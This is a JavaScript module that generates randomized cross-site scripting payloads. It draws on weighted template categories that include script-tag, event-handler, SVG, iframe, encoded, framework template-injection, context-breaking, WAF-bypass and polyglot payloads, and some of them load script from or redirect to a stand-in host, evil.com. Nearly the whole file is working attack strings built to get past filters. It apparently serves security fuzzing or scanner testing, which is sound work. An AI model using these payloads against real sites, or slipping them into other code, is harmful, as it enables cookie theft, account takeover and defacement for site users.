/**
 * Payload Generator Utility
 * Generates random XSS payloads using template-based approach with randomization
 */

// Random number generator for payload variations
const randomNum = () => Math.floor(Math.random() * 100) + 1;

// Random choice from array
const randomChoice = (arr) => arr[Math.floor(Math.random() * arr.length)];

// Random boolean with probability
const randomBool = (probability = 0.5) => Math.random() < probability;

// Base64 encode helper
const toBase64 = (str) => {
  try {
    return btoa(str);
  } catch (e) {
    // Fallback for non-ASCII characters
    return btoa(unescape(encodeURIComponent(str)));
  }
};

// JavaScript payloads for script injection
const JS_PAYLOADS = [
  'alert(1)',
  'alert(document.domain)',
  'alert(document.cookie)',
  'alert(window.origin)',
  'prompt(1)',
  'confirm(1)',
  'console.log(1)',
  'eval("alert(1)")',
  'window.location="//evil.com"'
];

// Event handlers
const EVENT_HANDLERS = [
  'onerror', 'onload', 'onclick', 'onmouseover', 'onfocus',
  'onblur', 'onchange', 'onsubmit', 'oninput', 'onmouseenter',
  'onmouseleave', 'ondblclick', 'onkeypress', 'onkeydown',
  'onbeforeunload', 'onanimationend', 'ontransitionend'
];

// HTML tags
const HTML_TAGS = [
  'img', 'svg', 'body', 'input', 'div', 'iframe', 'object',
  'embed', 'video', 'audio', 'details', 'summary', 'marquee',
  'form', 'button', 'select', 'textarea', 'keygen'
];

// HTML attributes
const HTML_ATTRIBUTES = [
  'src', 'href', 'data', 'action', 'formaction', 'poster',
  'background', 'cite', 'codebase', 'profile', 'usemap'
];

// Quote styles
const QUOTE_STYLES = ['"', "'", ''];

// Whitespace variations
const WHITESPACE = ['', ' ', '\t', '\n', '\r', ' \t', '\n\t'];

// Comments
const COMMENTS = ['/**/', '<!--', '-->', '/* test */', '// comment\n'];

// DOM properties for DOM-based XSS
const DOM_SINKS = [
  'document.write', 'document.writeln', 'innerHTML', 'outerHTML',
  'insertAdjacentHTML', 'eval', 'setTimeout', 'setInterval',
  'Function', 'location', 'location.href', 'location.hash'
];

// Framework-specific template delimiters
const FRAMEWORK_TEMPLATES = {
  angular: ['{{', '}}'],
  vue: ['{{', '}}'],
  handlebars: ['{{', '}}'],
  mustache: ['{{', '}}']
};

/**
 * 1. Script Tag Templates (15% weight)
 */
function generateScriptTag() {
  const jsPayload = randomChoice(JS_PAYLOADS);
  const num = randomNum();
  const quote = randomChoice(QUOTE_STYLES);
  const ws = randomChoice(WHITESPACE);

  const templates = [
    `<script>${jsPayload}</script>`,
    `<script${ws}>${jsPayload}</script>`,
    `<script>alert(${num})</script>`,
    `<script src=${quote}//evil.com/xss.js${quote}></script>`,
    `<script/**/>${jsPayload}</script>`,
    `<script>/**/alert(${num})/**/</script>`,
    `<script>eval("${jsPayload}")</script>`,
    `<script>prompt(${num})</script>`,
    `<script>confirm(${num})</script>`,
    `<script>setTimeout("${jsPayload}",0)</script>`,
    // New additions
    `<script>setInterval("${jsPayload}",1000)</script>`,
    `<script>(()=>{${jsPayload}})();</script>`,
    `<script async>${jsPayload}</script>`,
    `<script defer>${jsPayload}</script>`,
    `<script type="text/javascript">${jsPayload}</script>`,
    `<script charset="utf-8">${jsPayload}</script>`,
    `<script>Function("${jsPayload}")();</script>`,
    `<script>{onerror=alert}throw ${num}</script>`,
    `<script>throw onerror=alert,${num}</script>`,
    `<script>alert\`${num}\`</script>`
  ];

  return {
    payload: randomChoice(templates),
    category: 'script-tag',
    technique: 'script',
    context: 'html',
    generated: true
  };
}

/**
 * 2. Event Handler Templates (25% weight)
 */
function generateEventHandler() {
  const tag = randomChoice(HTML_TAGS);
  const event = randomChoice(EVENT_HANDLERS);
  const jsPayload = randomChoice(JS_PAYLOADS);
  const attr = randomChoice(HTML_ATTRIBUTES);
  const quote = randomChoice(QUOTE_STYLES);
  const ws = randomChoice(WHITESPACE);
  const num = randomNum();

  const templates = [
    `<img src=x ${event}=alert(${num})>`,
    `<svg/${event}=alert(${num})>`,
    `<${tag} ${event}=alert(${num})>`,
    `<${tag}${ws}${event}=${quote}${jsPayload}${quote}>`,
    `<img ${attr}=x ${event}=alert(${num})>`,
    `<${tag} autofocus ${event}=alert(${num})>`,
    `<body ${event}=${quote}alert(${num})${quote}>`,
    `<input ${event}=${jsPayload} autofocus>`,
    `<details open ${event}=alert(${num})>`,
    `<select ${event}=alert(${num})><option>click</option></select>`,
    // New additions
    `<img src="x"${ws}${event}=${quote}${jsPayload}${quote}>`,
    `<${tag} draggable="true" ondragstart=alert(${num})>drag</div>`,
    `<${tag} contenteditable ${event}=alert(${num})>`,
    `<style ${event}=alert(${num})></style>`,
    `<form><button formaction=javascript:alert(${num})>click`,
    `<marquee ${event}=alert(${num})>XSS</marquee>`,
    `<isindex type=submit value=XSS ${event}=alert(${num})>`,
    `<bgsound ${event}=alert(${num})>`,
    `<keygen autofocus ${event}=alert(${num})>`,
    `<math><mi ${event}=alert(${num})>x</mi></math>`
  ];

  return {
    payload: randomChoice(templates),
    category: 'event-handler',
    technique: event,
    context: 'html',
    generated: true
  };
}

/**
 * 3. SVG-based Templates (10% weight)
 */
function generateSVG() {
  const jsPayload = randomChoice(JS_PAYLOADS);
  const num = randomNum();
  const ws = randomChoice(WHITESPACE);

  const templates = [
    `<svg><script>${jsPayload}</script></svg>`,
    `<svg/onload=alert(${num})>`,
    `<svg${ws}onload=${jsPayload}>`,
    `<svg><animate onbegin=alert(${num}) />`,
    `<svg><set attributeName=onload to=alert(${num})>`,
    `<svg><script>alert(${num})</script></svg>`,
    `<svg><foreignObject><body onload=alert(${num})></foreignObject></svg>`,
    `<svg><use xlink:href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(${num})</script></svg>#x" />`,
    `<svg onload=alert(${num})//`,
    `<math><mtext><table><mglyph><svg onload=alert(${num})>`,
    // New additions
    `<svg><animatetransform onbegin=alert(${num})>`,
    `<svg><title><![CDATA[</title><script>alert(${num})</script>]]></title>`,
    `<svg><a xlink:href=javascript:alert(${num})><text>XSS</text></a></svg>`,
    `<svg><discard onbegin=alert(${num})>`,
    `<svg><image href=x onerror=alert(${num})>`,
    `<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">${jsPayload}</handler></svg>`
  ];

  return {
    payload: randomChoice(templates),
    category: 'svg',
    technique: 'svg-injection',
    context: 'html',
    generated: true
  };
}

/**
 * 4. Protocol Handler Templates (10% weight)
 */
function generateProtocolHandler() {
  const jsPayload = randomChoice(JS_PAYLOADS);
  const num = randomNum();
  const scriptTag = `<script>alert(${num})</script>`;
  const base64Script = toBase64(scriptTag);

  const templates = [
    `javascript:alert(${num})`,
    `javascript:${jsPayload}`,
    `data:text/html,${scriptTag}`,
    `data:text/html,<body onload=alert(${num})>`,
    `data:text/html;base64,${base64Script}`,
    `data:text/html;charset=utf-8,<script>alert(${num})</script>`,
    `vbscript:msgbox(${num})`,
    `javascript:void(${jsPayload})`,
    `javascript://comment%0aalert(${num})`,
    `data:,alert(${num})`,
    // New additions
    `javascript:/*%0a*/alert(${num})`,
    `javascript:eval(atob('${toBase64(jsPayload)}'))`,
    `data:text/html,<svg onload=alert(${num})>`,
    `data:image/svg+xml,<svg onload=alert(${num})></svg>`,
    `data:application/x-javascript,alert(${num})`,
    `jar:javascript:alert(${num})!/`
  ];

  return {
    payload: randomChoice(templates),
    category: 'protocol-handler',
    technique: 'protocol',
    context: 'url',
    generated: true
  };
}

/**
 * 5. Iframe-based Templates (8% weight)
 */
function generateIframe() {
  const jsPayload = randomChoice(JS_PAYLOADS);
  const num = randomNum();
  const quote = randomChoice(QUOTE_STYLES);

  const templates = [
    `<iframe src=${quote}javascript:alert(${num})${quote}>`,
    `<iframe srcdoc=${quote}<script>alert(${num})</script>${quote}>`,
    `<iframe onload=alert(${num})>`,
    `<iframe src=javascript:${jsPayload}>`,
    `<iframe srcdoc="<body onload=alert(${num})>">`,
    `<iframe src=data:text/html,<script>alert(${num})</script>>`,
    `<iframe src=//evil.com onload=alert(${num})>`,
    `<iframe src=x ${randomChoice(EVENT_HANDLERS)}=alert(${num})>`,
    `<iframe sandbox=allow-scripts srcdoc="<script>alert(${num})</script>">`,
    `<iframe name=alert(${num})>`,
    // New additions
    `<iframe src=data:text/html;base64,${toBase64(`<script>alert(${num})</script>`)}>`,
    `<iframe srcdoc="<svg onload=alert(${num})>">`,
    `<iframe sandbox=allow-scripts allow-same-origin srcdoc="<script>${jsPayload}</script>">`,
    `<iframe csp="script-src 'unsafe-inline'" srcdoc="<script>alert(${num})</script>">`
  ];

  return {
    payload: randomChoice(templates),
    category: 'iframe',
    technique: 'iframe-injection',
    context: 'html',
    generated: true
  };
}

/**
 * 6. Attribute-based Templates (4% weight)
 */
function generateAttributeBased() {
  const jsPayload = randomChoice(JS_PAYLOADS);
  const num = randomNum();
  const quote = randomChoice(QUOTE_STYLES);

  const templates = [
    `<a href=${quote}javascript:alert(${num})${quote}>click</a>`,
    `<form action=${quote}javascript:alert(${num})${quote}><input type=submit>`,
    `<object data=${quote}javascript:alert(${num})${quote}>`,
    `<embed src=javascript:alert(${num})>`,
    `<link rel=import href=data:text/html,<script>alert(${num})</script>>`,
    `<base href=javascript:alert(${num})//>`,
    `<video src=x onerror=alert(${num})>`,
    `<audio src=x onerror=alert(${num})>`,
    `<button formaction=javascript:alert(${num})>click</button>`,
    `<input type=image src=x formaction=javascript:alert(${num})>`,
    // New additions
    `<applet code=javascript:alert(${num})>`,
    `<meta http-equiv=refresh content="0;url=javascript:alert(${num})">`,
    `<link rel=stylesheet href=javascript:alert(${num})>`,
    `<bgsound src=javascript:alert(${num})>`,
    `<frameset onload=alert(${num})>`,
    `<table background=javascript:alert(${num})>`
  ];

  return {
    payload: randomChoice(templates),
    category: 'attribute',
    technique: 'attribute-injection',
    context: 'html',
    generated: true
  };
}

/**
 * 7. Encoded/Obfuscated Templates (4% weight)
 */
function generateEncoded() {
  const num = randomNum();
  const jsPayload = randomChoice(JS_PAYLOADS);

  // HTML entity encode
  const entityEncoded = 'alert(1)'.split('').map(c =>
    `&#${c.charCodeAt(0)};`
  ).join('');

  // Hex encode
  const hexEncoded = 'alert(1)'.split('').map(c =>
    `&#x${c.charCodeAt(0).toString(16)};`
  ).join('');

  // Character codes
  const charCodes = [97, 108, 101, 114, 116, 40, 49, 41]; // alert(1)

  const base64Alert = toBase64(jsPayload);

  const templates = [
    `<img src=x onerror="${entityEncoded}">`,
    `<img src=x onerror="${hexEncoded}">`,
    `<svg><script>eval(String.fromCharCode(${charCodes.join(',')}))</script></svg>`,
    `<img src=x onerror=eval(atob('${base64Alert}'))>`,
    `<svg><script>eval(atob('${base64Alert}'))</script></svg>`,
    `<img src=x onerror="&#x61;lert(${num})">`,
    `<svg onload=&#97;&#108;&#101;&#114;&#116;(${num})>`,
    `<img src=x onerror=\u0061lert(${num})>`,
    `<script>eval('\\u0061lert(${num})')</script>`,
    `<img src=x onerror=eval('\\x61lert(${num})')>`,
    // New additions
    `<script>eval(unescape('%61%6c%65%72%74%28${num}%29'))</script>`,
    `<img src=x onerror=\x61\x6C\x65\x72\x74(${num})>`,
    `<script>Function('al'+'ert(${num})')();</script>`,
    `<script>eval(String.fromCharCode(97)+String.fromCharCode(108)+'ert(${num})')</script>`,
    `<img src=x onerror="eval('al'+'ert(${num})')">`,
    `<script>eval([...atob('${base64Alert}')].join(''))</script>`
  ];

  return {
    payload: randomChoice(templates),
    category: 'encoded',
    technique: 'encoding',
    context: 'html',
    generated: true
  };
}

/**
 * 8. DOM-based XSS Templates (8% weight)
 */
function generateDOMBased() {
  const num = randomNum();
  const sink = randomChoice(DOM_SINKS);
  const jsPayload = randomChoice(JS_PAYLOADS);

  const templates = [
    `<script>${sink}('<img src=x onerror=alert(${num})>')</script>`,
    `<script>${sink}('${jsPayload}')</script>`,
    `<script>document.body.innerHTML='<img src=x onerror=alert(${num})>'</script>`,
    `<script>document.body.insertAdjacentHTML('beforeend','<svg onload=alert(${num})>')</script>`,
    `<script>eval('alert(${num})')</script>`,
    `<script>setTimeout('alert(${num})',0)</script>`,
    `<script>setInterval('alert(${num})',1000)</script>`,
    `<script>new Function('alert(${num})')();</script>`,
    `<script>location='javascript:alert(${num})'</script>`,
    `<script>location.href='javascript:alert(${num})'</script>`
  ];

  return {
    payload: randomChoice(templates),
    category: 'dom-based',
    technique: sink,
    context: 'javascript',
    generated: true
  };
}

/**
 * 9. Framework-specific Templates (7% weight)
 */
function generateFramework() {
  const num = randomNum();
  const jsPayload = randomChoice(JS_PAYLOADS);

  const templates = [
    // AngularJS
    `{{constructor.constructor('alert(${num})')()}}`,
    `{{$on.constructor('alert(${num})')()}}`,
    `<div ng-app ng-csp><input autofocus ng-focus="$event.view.alert(${num})"></div>`,
    `{{7*7}}`, // Template injection test
    `{{[].constructor.constructor('alert(${num})')()}}`,

    // Vue.js
    `{{_c.constructor('alert(${num})')()}}`,
    `{{constructor.constructor('alert(${num})')()}}`,

    // React
    `<img src=x onerror={alert(${num})} />`,
    `{this.constructor.constructor('alert(${num})')()}`,

    // Handlebars/Mustache
    `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return alert(${num});"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}`
  ];

  return {
    payload: randomChoice(templates),
    category: 'framework',
    technique: 'template-injection',
    context: 'javascript',
    generated: true
  };
}

/**
 * 10. Context-breaking Templates (8% weight)
 */
function generateContextBreaking() {
  const num = randomNum();
  const jsPayload = randomChoice(JS_PAYLOADS);

  const templates = [
    // Break out of attribute
    `" autofocus onfocus=alert(${num}) x="`,
    `' autofocus onfocus=alert(${num}) x='`,
    `"><img src=x onerror=alert(${num})>`,
    `'><img src=x onerror=alert(${num})>`,

    // Break out of script string
    `</script><img src=x onerror=alert(${num})>`,
    `'-alert(${num})-'`,
    `";alert(${num});//`,
    `';alert(${num});//`,

    // Break out of HTML comment
    `--><img src=x onerror=alert(${num})><!--`,
    `--!><img src=x onerror=alert(${num})><!--`,

    // Break out of CDATA
    `]]><img src=x onerror=alert(${num})>`,

    // Break out of textarea/title
    `</textarea><img src=x onerror=alert(${num})>`,
    `</title><img src=x onerror=alert(${num})>`,

    // Break out of style
    `</style><img src=x onerror=alert(${num})>`
  ];

  return {
    payload: randomChoice(templates),
    category: 'context-breaking',
    technique: 'escape',
    context: 'mixed',
    generated: true
  };
}

/**
 * 11. WAF Bypass Templates (7% weight)
 */
function generateWAFBypass() {
  const num = randomNum();

  const templates = [
    // Null byte
    `<img src=x onerror=alert(${num})%00>`,

    // Mixed case
    `<ScRiPt>alert(${num})</sCrIpT>`,
    `<iMg sRc=x oNeRrOr=alert(${num})>`,

    // Newline/carriage return
    `<img src=x onerror=\nalert(${num})>`,
    `<img src=x onerror=\ralert(${num})>`,
    `<img src=x onerror=\r\nalert(${num})>`,

    // Tab characters
    `<img\tsrc=x\tonerror=alert(${num})>`,

    // Backticks
    `<img src=\`x\` onerror=alert(${num})>`,

    // Alternative equals
    `<img src=x onerror\x09=alert(${num})>`,

    // Comment breaking
    `<img src=x o<!-- -->nerror=alert(${num})>`,
    `<scr<!---->ipt>alert(${num})</scr<!---->ipt>`,

    // Unicode/UTF-7
    `+ADw-img src=x onerror=alert(${num})+AD4-`,

    // Double encoding
    `%253Cimg%2520src=x%2520onerror=alert(${num})%253E`,

    // Slash variations
    `<img/src=x/onerror=alert(${num})>`
  ];

  return {
    payload: randomChoice(templates),
    category: 'waf-bypass',
    technique: 'evasion',
    context: 'html',
    generated: true
  };
}

/**
 * 12. Modern HTML5/API Templates (5% weight)
 */
function generateModernHTML5() {
  const num = randomNum();
  const jsPayload = randomChoice(JS_PAYLOADS);

  const templates = [
    // Service Worker
    `<script>navigator.serviceWorker.register('/sw.js').then(()=>{alert(${num})})</script>`,

    // Web Components
    `<custom-element onload=alert(${num})></custom-element>`,

    // Import maps
    `<script type="importmap">{"imports":{"x":"data:text/javascript,alert(${num})"}}</script>`,

    // Module scripts
    `<script type=module>import('data:text/javascript,alert(${num})')</script>`,

    // Shadow DOM
    `<div id=host></div><script>host.attachShadow({mode:'open'}).innerHTML='<img src=x onerror=alert(${num})>'</script>`,

    // Picture element
    `<picture><source srcset="x" onerror=alert(${num})></picture>`,

    // Slot element
    `<slot onfocus=alert(${num}) autofocus></slot>`,

    // Meta refresh
    `<meta http-equiv="refresh" content="0;url=javascript:alert(${num})">`,

    // Link prefetch
    `<link rel=prefetch href="javascript:alert(${num})">`,

    // Portal element
    `<portal src="javascript:alert(${num})" onload=alert(${num})></portal>`
  ];

  return {
    payload: randomChoice(templates),
    category: 'html5',
    technique: 'modern-api',
    context: 'html',
    generated: true
  };
}

/**
 * 13. Polyglot Templates (5% weight)
 */
function generatePolyglot() {
  const num = randomNum();

  const templates = [
    // Works in HTML and JavaScript
    `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(${num})//'>`,

    // Works in multiple contexts
    `"'><img src=x onerror=alert(${num})>`,

    // HTML + SVG
    `<svg><script>alert(${num})</script></svg>`,

    // HTML + Data URI
    `<object data="data:text/html,<script>alert(${num})</script>">`,

    // JavaScript string + HTML
    `';alert(${num})//--></script><img src=x><!--`,

    // Multi-language comment
    `/*'/*--></script><img src=x onerror=alert(${num})>//'`,

    // Works as attribute value or standalone
    `x onerror=alert(${num})`,

    // XML + HTML
    `<![CDATA[<img src=x onerror=alert(${num})>]]>`,

    // PHP + HTML
    `<?='<img src=x onerror=alert(${num})'?>`,

    // JSON + HTML
    `{"x":"<img src=x onerror=alert(${num})>"}`
  ];

  return {
    payload: randomChoice(templates),
    category: 'polyglot',
    technique: 'multi-context',
    context: 'mixed',
    generated: true
  };
}

/**
 * Category generators with weights
 */
const GENERATORS = [
  { generator: generateScriptTag, weight: 15 },      // Reduced from 20
  { generator: generateEventHandler, weight: 25 },   // Reduced from 30
  { generator: generateSVG, weight: 10 },            // Reduced from 15
  { generator: generateProtocolHandler, weight: 10 }, // Reduced from 15
  { generator: generateIframe, weight: 8 },          // Reduced from 10
  { generator: generateAttributeBased, weight: 4 },  // Reduced from 5
  { generator: generateEncoded, weight: 4 },         // Reduced from 5
  { generator: generateDOMBased, weight: 8 },        // NEW
  { generator: generateFramework, weight: 7 },       // NEW
  { generator: generateContextBreaking, weight: 8 }, // NEW
  { generator: generateWAFBypass, weight: 7 },       // NEW
  { generator: generateModernHTML5, weight: 5 },     // NEW
  { generator: generatePolyglot, weight: 4 }         // NEW (originally listed as 5 but adjusted to 4 to total 115, will normalize)
];
// Total weight: 115 (will be normalized by percentage calculation)

// Calculate cumulative weights
const totalWeight = GENERATORS.reduce((sum, g) => sum + g.weight, 0);
const cumulativeWeights = [];
let cumulative = 0;
GENERATORS.forEach(g => {
  cumulative += g.weight;
  cumulativeWeights.push({ generator: g.generator, threshold: cumulative / totalWeight });
});

/**
 * Select a random generator based on weights
 */
function selectGenerator() {
  const rand = Math.random();
  for (const { generator, threshold } of cumulativeWeights) {
    if (rand <= threshold) {
      return generator;
    }
  }
  return GENERATORS[0].generator; // Fallback
}

/**
 * Apply random variations to a payload
 */
function applyRandomVariations(payload) {
  let result = payload;

  // Random whitespace insertion (20% chance)
  if (randomBool(0.2)) {
    const ws = randomChoice(WHITESPACE);
    result = result.replace(/<(\w+)/, `<${ws}$1`);
  }

  // Random case variation on tag name (10% chance)
  if (randomBool(0.1)) {
    result = result.replace(/<(\w+)/, (match, tag) => {
      return '<' + tag.split('').map(c =>
        randomBool(0.5) ? c.toUpperCase() : c.toLowerCase()
      ).join('');
    });
  }

  // Random comment insertion (5% chance)
  if (randomBool(0.05)) {
    const comment = randomChoice(COMMENTS);
    result = result.replace(/>/, `>${comment}`);
  }

  return result;
}

/**
 * Generate random XSS payloads
 * @param {number} count - Number of payloads to generate
 * @param {object} options - Generation options
 * @returns {array} Array of generated payload objects
 */
export function generateRandomPayloads(count = 10, options = {}) {
  const {
    applyVariations = true
  } = options;

  const payloads = [];

  for (let i = 0; i < count; i++) {
    const generator = selectGenerator();
    let payloadObj = generator();

    // Apply random variations
    if (applyVariations && randomBool(0.3)) {
      payloadObj.payload = applyRandomVariations(payloadObj.payload);
    }

    payloads.push(payloadObj);
  }

  return payloads;
}
